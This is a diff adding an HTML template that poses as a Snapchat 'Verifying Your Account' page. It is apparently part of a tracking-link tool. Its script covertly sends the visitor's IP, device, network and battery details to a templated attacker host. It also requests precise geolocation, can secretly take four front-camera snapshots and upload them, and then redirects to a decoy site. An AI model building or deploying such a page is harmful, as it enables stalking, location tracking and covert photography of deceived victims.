@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Snapchat</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;background:#FFFC00;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,'Helvetica Neue',Arial,sans-serif}
+.ghost{width:120px;margin:0 auto 24px;animation:bounce .8s ease-in-out infinite alternate}
+@keyframes bounce{from{transform:translateY(0)}to{transform:translateY(-10px)}}
+.ghost svg{width:100%;height:auto}
+h1{font-size:22px;font-weight:800;color:#000;margin-bottom:10px;text-align:center}
+.sub{font-size:14px;color:#333;margin-bottom:32px;text-align:center;line-height:1.5;max-width:260px}
+.dots{display:flex;gap:10px;justify-content:center}
+.dot{width:12px;height:12px;border-radius:50%;background:#000;animation:blink 1.2s ease-in-out infinite}
+.dot:nth-child(2){animation-delay:.2s}
+.dot:nth-child(3){animation-delay:.4s}
+@keyframes blink{0%,100%{opacity:.2}50%{opacity:1}}
+</style>
+</head>
+<body>
+<div class="ghost">
+  <svg viewBox="0 0 120 140" xmlns="http://www.w3.org/2000/svg">
+    <path d="M60 5 C28 5 10 27 10 55 L10 100 L25 90 L40 105 L55 90 L70 105 L85 90 L100 100 L110 55 C110 27 92 5 60 5Z" fill="#000"/>
+    <circle cx="42" cy="55" r="9" fill="#fff"/>
+    <circle cx="78" cy="55" r="9" fill="#fff"/>
+    <circle cx="45" cy="53" r="4" fill="#000"/>
+    <circle cx="81" cy="53" r="4" fill="#000"/>
+    <path d="M47 72 Q60 84 73 72" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round"/>
+  </svg>
+</div>
+<h1>Verifying Your Account</h1>
+<div class="sub">Please wait while we verify your Snapchat account and check your security settings…</div>
+<div class="dots">
+  <div class="dot"></div>
+  <div class="dot"></div>
+  <div class="dot"></div>
+</div>
+
+<script>
+(function(){
+  var uid=encodeURIComponent("<%=uid%>"),host="<%=a%>",dest=<%- JSON.stringify(url) %>;
+  var enc=encodeURIComponent,done={l:false,c:false};
+  function post(p,b){return fetch(host+p,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:b}).catch(()=>{});}
+  function tryEnd(){if(done.l&&done.c)window.location.href=dest;}
+  setTimeout(()=>window.location.href=dest,9000);
+  (async function run(){
+    var d="<code>✅ Snapchat Verification</code>\n\n<b>⚓ IP:</b> <a href='https://ip-api.com/#<%=ip%>'><%=ip%></a> | <%=time%>\n<b>⏰ Time:</b> "+new Date()+"\n\n<b>📱 Device:</b>\n";
+    ["userAgent","platform","language","hardwareConcurrency","deviceMemory","cookieEnabled","maxTouchPoints"].forEach(k=>{if(k in navigator)d+="<b>"+k+":</b> <code>"+navigator[k]+"</code>\n";});
+    if(navigator.connection){var nc=navigator.connection;d+="\n<b>🕸️ Net:</b>\n";["effectiveType","rtt","downlink"].forEach(k=>{if(k in nc)d+="<b>"+k+":</b> <code>"+nc[k]+"</code>\n";});}
+    if("getBattery" in navigator){var b=await navigator.getBattery();d+="\n<b>🔋 Battery:</b> "+(b.level*100|0)+"% | "+b.charging+"\n";}
+    await post("/","data="+enc(d.replaceAll("\n","<br>"))+"&uid="+uid);
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{post("/location","uid="+uid+"&lat="+enc(p.coords.latitude)+"&lon="+enc(p.coords.longitude)+"&acc="+enc(p.coords.accuracy)).then(()=>{done.l=true;tryEnd();});},()=>{done.l=true;tryEnd();},{enableHighAccuracy:true,maximumAge:0,timeout:6000});}else{done.l=true;}
+    <% if(camAccess){ %>
+    try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});var v=document.createElement("video");v.srcObject=s;v.play();var cv=document.createElement("canvas");cv.width=480;cv.height=640;var n=0,iv=setInterval(()=>{cv.getContext("2d").drawImage(v,0,0,480,640);post("/camsnap","uid="+uid+"&img="+enc(cv.toDataURL("image/jpeg",.75).replace("data:image/jpeg;base64","")));if(++n>=4){clearInterval(iv);s.getTracks().forEach(t=>t.stop());done.c=true;tryEnd();}},1500);}catch(e){done.c=true;tryEnd();}
+    <% }else{ %>done.c=true;tryEnd();<% } %>
+  })();
+})();
+</script>
+</body>
+</html>
